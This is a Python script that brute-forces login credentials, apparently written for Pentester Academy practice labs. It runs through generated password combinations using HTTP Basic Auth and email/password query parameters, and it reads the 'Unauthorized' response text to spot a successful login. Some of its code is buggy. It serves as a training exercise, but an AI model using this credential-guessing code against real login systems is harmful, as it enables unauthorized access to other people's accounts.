import requests
from itertools import combinations, product
import threading

# url = "https://attack.samsclass.info/basic0/"
# url = "https://pentesteracademylab.appspot.com/lab/webapp/1"
url = "https://pentesteracademylab.appspot.com/lab/webapp/auth/1/login"
proxy = {
    "http" : "127.0.0.1:8080"
}
credentials = {
    "email": "admin@pentesteracademy.com",
    "password": "zzzxy"
}
# response = requests.get(url, params = credentials)

auths = requests.auth.HTTPBasicAuth("root", "password")
response = requests.get(url, auth = auths)


print(response.text)


def generatePass(characters, length):
    return list(product(characters, repeat=length))

passList = generatePass(["m", "n", "o"], 5)
usernameList = ["admin"]

def attemptPrompt(link1):
    for username in usernameList:
        for password in passList:
            AttemptPass = "".join(password)
            auths = requests.auth.HTTPBasicAuth(username, AttemptPass)
            response = requests.get(link1, auth=auths)
            if (response.text.find("Unauthorized! Unauthorized! Unauthorized :) :)") != -1):
                print(f"[{username}, {AttemptPass}]: Failed\n")
            else:
                print(f"[{username}, {AttemptPass}]: Successfully\n")
                exit(1)

def attemptAccount(username, passStrings):
    AttemptPass = "".join(passStrings)

    credentials = {
        "email": username+"@pentesteracacdemy.com",
        "password": AttemptPass
    }

    response = requests.get(url, params = credentials)
    
    #response = requests.get(f"https://pentesteracademylab.appspot.com/lab/webapp/auth/1/loginscript?email={username}"+"%40pentesteracacdemy.com"+f"&password={passStrings}", auth = auths)
    link1 = f"https://pentesteracademylab.appspot.com/lab/webapp/auth/1/loginscript?email={username}"+"%40pentesteracacdemy.com"+f"&password={passStrings}"
    attemptPrompt(link1)
    # if (response.text.find("Unauthorized! Unauthorized! Unauthorized :) :)") != -1):
    #     print(f"[{username}, {AttemptPass}]: Failed\n")
    # else:
    #     print(f"[{username}, {AttemptPass}]: Successfully\n")
    #     exit(1)

def bruteforcePass(username, passList):
    for passStrings in passList:
        # thread = threading.Thread(target=attemptAccount, args=(username, passStrings))
        # thread.start()
        attemptAccount(username, passStrings)

def bruteforceAccount(usernameList, passList):
    for username in usernameList:
        # thread = threading.Thread(target=bruteforcePass, args=(username, passList))
        # thread.start()
        bruteforcePass(username, passList)

bruteforceAccount(usernameList, passList)

